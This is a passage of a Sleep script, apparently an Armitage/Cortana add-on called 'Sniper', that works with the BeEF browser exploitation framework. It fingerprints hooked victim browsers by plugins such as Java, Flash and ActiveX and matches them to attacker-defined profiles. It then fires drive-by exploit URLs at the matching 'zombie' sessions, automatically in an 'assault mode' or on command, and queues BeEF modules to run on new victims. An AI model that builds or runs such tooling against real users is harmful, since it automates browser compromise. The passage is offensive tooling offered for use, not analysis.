			@beef_autorun[$id_beef_autorun] = %cmd6; $id_beef_autorun = $id_beef_autorun + 1 ;
			@beef_autorun[$id_beef_autorun] = %cmd7; $id_beef_autorun = $id_beef_autorun + 1 ;
			@beef_autorun[$id_beef_autorun] = %cmd8; $id_beef_autorun = $id_beef_autorun + 1 ;
			say("BeEF system profiling modules have been loaded. Check autorun command list");
			$recon = 1 ;
			}	
	}
	
#######  PROFILES DEFINITION #####
# These actions is very important for Sniper's functionnalities: 
# Here you define what exploits to use against any browser profile
sub refresh_profiles {
	table_set($1, @targets);
	}
sub edit_profiles {
	@i = flatten(table_selected($1, "id"));
	@brow = flatten(table_selected($1, "Browser"));
	@ver = flatten(table_selected($1, "Version"));
	@os = flatten(table_selected($1, "OS"));
	@plat = flatten(table_selected($1, "Platform"));
	@actv = flatten(table_selected($1, "ActiveX"));
	@fls = flatten(table_selected($1, "Flash"));
	@jv = flatten(table_selected($1, "Java"));
	@vbs = flatten(table_selected($1, "VBScript"));
	@plg = flatten(table_selected($1, "Plugins"));
	@urlb = flatten(table_selected($1, "Attack_URL"));
	
	$id_dr = @i[0];
	$brow_dr = @brow[0];
	$ver_dr = @ver[0];
	$os_dr = @os[0];
	$plat_dr = @plat[0]; 
	$actv_dr = @actv[0]; 
	$fls_dr = @fls[0]; 
	$jv_dr = @jv[0]; 
	$vbs_dr = @vbs[0]; 
	$plg_dr = @plg[0]; 
	$urlb_dr = @urlb[0]; 
	
	$browser_dr = prompt_text("Browser","$brow_dr");
	$version_dr = prompt_text("Version","$ver_dr");
	$os_dr = prompt_text("OS","$os_dr");
	$platform_dr = prompt_text("Plateform","$plat_dr");
	$activex_dr = prompt_text("Activex","$actv_dr");
	$flash_dr = prompt_text("Flash","$fls_dr");
	$java_dr = prompt_text("Java","$jv_dr");
	$vbs_dr = prompt_text("VBScript","$vbs_dr");
	$plugins_dr = prompt_text("Plugins ","$plg_dr");
	$url_dr = prompt_text("URL of the attack to map with this profile","$urlb_dr");
	%host_dr = %(id => $targets_id, Browser => "$browser_dr", Version => "$version_dr", OS => "$os_dr", Platform => "$platform_dr", ActiveX => "$activex_dr", Flash => "$flash_dr", Java => "$java_dr", VBScript => "$vbs_dr", Plugins => "$plugins_dr" , Attack_URL => "$url_dr");
	@targets[$id_dr] = %host_dr;
	refresh_profiles($1);
	}
sub add_profiles {
	$browser_dr = prompt_text("Browser","*");
	$version_dr = prompt_text("Version","*");
	$os_dr = prompt_text("OS","*");
	$platform_dr = prompt_text("Plateform","*");
	$activex_dr = prompt_text("Activex","*");
	$flash_dr = prompt_text("Flash","*");
	$java_dr = prompt_text("Java","*");
	$vbs_dr = prompt_text("VBScript","*");
	$plugins_dr = prompt_text("Plugins ","*");
	$url_dr = prompt_text("URL of the attack to map with this profile","http://");
	%host_dr = %(id => "$targets_id", Browser => "$browser_dr", Version => "$version_dr", OS => "$os_dr", Platform => "$platform_dr", ActiveX => "$activex_dr", Flash => "$flash_dr", Java => "$java_dr", VBScript => "$vbs_dr", Plugins => "$plugins_dr" , Attack_URL => "$url_dr");
	@targets[$targets_id] = %host_dr;
	$targets_id = $targets_id + 1 ;
	refresh_profiles($1);
	}
sub delete_profiles {
	@i = flatten(table_selected($1, "id"));
	$id_dr = @i[0];
	removeAt(@targets, $id_dr); 
	refresh_profiles($1);
	}
sub delete_entry {
	@i = flatten(table_selected($1, "cc"));
	$cc = @i[0];
	removeAt(@beef_autorun, $cc); 
	refresh_list($1);
	}
#----------------------------------------------------------------#
sub editparam {
	@cc = flatten(table_selected($1, "cc"));
	@editparm = flatten(table_selected($1, "Param"));
	$cc = @cc[0];
	$editparm = @editparm[0]; 
	$editparm = prompt_text("URL of the attack to map with this profile","$editparm");
	@beef_autorun[$cc]["Param"] = $editparm ;
	refresh_list($1);
}
# this action change URL that have been affected by sniper to a particular zombie.
sub changeurl {
	@i = flatten(table_selected($1, "id"));
	@urlb = flatten(table_selected($1, "Attack_URL"));
	$id_dr = @i[0];
	$urlb_dr = @urlb[0];
	$url_dr = prompt_text("URL of the attack to map with this profile","$urlb_dr");
	@analyze[$id_dr]["Attack_URL"] = $url_dr ;
	refresh_analyze($1);
	}

###- intelligence analysis -####
sub match_it {
#### STEP 1  -  extracted informations about a particular zombie.
   if ($key ne "00000000000000000000000" ){  
	$BrowserName = @browser_profile_list[$1]["Browser"] ;
	$BrowserPlugins = @browser_profile_list[$1]["Plugins"] ;
	$BrowserReportedName = @browser_profile_list[$1]["ReportedName"] ;
	$BrowserType = @browser_profile_list[$1]["Type"] ;
	$BrowserVersion = @browser_profile_list[$1]["Version"] ;
	$HasActiveX = @browser_profile_list[$1]["ActiveX"] ;
	$HasFlash = @browser_profile_list[$1]["Flash"] ;
	$HasGoogleGears = @browser_profile_list[$1]["GoogleGears"] ;
	$HasWebSocket = @browser_profile_list[$1]["WebSocket"] ;
	$HostName = @browser_profile_list[$1]["HostName"] ;
	$JavaEnabled = @browser_profile_list[$1]["Java"] ;
	$OsName = @browser_profile_list[$1]["OS"] ;
	$SystemPlatform = @browser_profile_list[$1]["Platform"] ;
	$VBScriptEnabled = @browser_profile_list[$1]["VBScript"];
	$sip = @beef_hosts[$1]["ip"];
	$sid = @beef_hosts[$1]["sessionID"];
	println($sid);
	%extracted = %(id => "$1", sessionID => "$sid", Browser => "$BrowserName", ReportedName => "$BrowserReportedName", Type => "$BrowserType", Version => "$BrowserVersion", OS => "$OsName", Platform => "$SystemPlatform", ActiveX => "$HasActiveX", Flash => "$HasFlash", Java => "$JavaEnabled", VBScript => "$VBScriptEnabled", Plugins => "$BrowserPlugins", GoogleGears => "$HasGoogleGears", WebSocket => "$HasWebSocket", HostName => "$HostName" );
	
#### STEP 2  -  Try to find profiles matching with zombies's informations
		foreach $index => $value (@targets){
			%profile = $value;
			foreach $index2 => $value2 (%profile){
				if ( $value2 eq "*" || "" || " "){
				$match = 1; continue;}
				$match_regex = "(.*|\\s) $+ $value2 $+ (\\s|.*)" ;
				if ( %extracted["$index2"] ismatch $match_regex){println("" . %extracted["$index2"] . "  > matchUP!!!" . $value2 . "");
				$match = 1;continue;}else{println("" . %extracted["$index2"] . "  > matchDOWN!!!" . $value2 . ""); $match = 0; break;}
			}
			if ($match == 1){
#### STEP 3  -  Zombies maps each with a client-side exploit well suited if we found one.				
			$inviframe = %profile["Attack_URL"];
			%analyz_dr = %(id => "$1", ip => "$sip", sessionID => "$sid" , Attack_URL => "$inviframe");
			@analyze["$id_analyz"] = %analyz_dr;
			$id_analyz = $id_analyz + 1 ;
			append($console , "Sniper has found a target that match with one of your defined profiles " )
				if ($assault_mode == 1){
				run_driveby($beefUrl, $sid, $key, $inviframe);
				append($console , "\c9[*] Sniper send attack (+)" . $inviframe . " >>> " . $sid . "" );
				} 
				else { append($console , "\cC[*] Sniper wait for assault mode activation ... "); 
				}			
			}else{
			append($console , "\c4[-] Sniper has found no profile corresponding for zombie<$sid>" )
			}
		} fire_event("play_autorun_cmd", $1);
	}
	else
	{ println("\c4[-]No Key available") ;}
}

# This action tell sniper to shot now all targets which appear on the line of sigh.
# No, this is not a FPS game. 
sub snipershot_all {
	#local('$inviframe $sid');
	if (size(@analyze) != 0) {
	for ($i = 0; $i <= size(@analyze); $i++)   {
			$sid = @analyze[$i]["sessionID"] ;
			$inviframe = @analyze[$i]["Attack_URL"] ;
			run_driveby($beefUrl, $sid, $key, $inviframe);
			append($console , "\c9[*] Sniper send attack (+)" . $inviframe . " >>> " . $sid . "" );
			} 
		} else {println("No profiles/zombies association found !")}
}
# This action send a particular client-side exploit (drive-by) again a target selected by our Sniper.
sub snipershot {
	#local('$inviframe $sessid_dr');
	@sessid = flatten(table_selected($1, "sessionID"));
	@urlattack = flatten(table_selected($1, "Attack_URL"));
	$sessid_dr = @sessid[0];
	$inviframe = @urlattack[0];
	run_driveby($beefUrl, $sessid_dr, $key, $inviframe);
	append($console , "\c9[*] Sniper send attack " . $inviframe . " >>> " . $sessid_dr . "" );
}
# This action execute each commands added to the beef's autorun list once a new zombie appear	
sub beef_autorun {
	$lim = size(@beef_autorun);
	if ( $size_on != 0 && $lim != 0  ) {
	$browser = @beef_hosts[$1]["name"];
	$sesside = @beef_hosts[$1]["sessionID"];
	 	for ($i = 0; $i < $lim; $i++)   {
			if ( $browser eq @beef_autorun[$i]["browser"]){
				$cmdeid = @beef_autorun[$i]["id"];
				$cmde_param = @beef_autorun[$i]["Param"];
				send_beefcmd_with_param($sesside, $cmdeid, $cmde_param,0);
			}
		}
	append($console, "\cB (!) BeEF say \"Command not send\", don't pay attention.");	
	} else { println("No zombie is online at this moment");}	
}	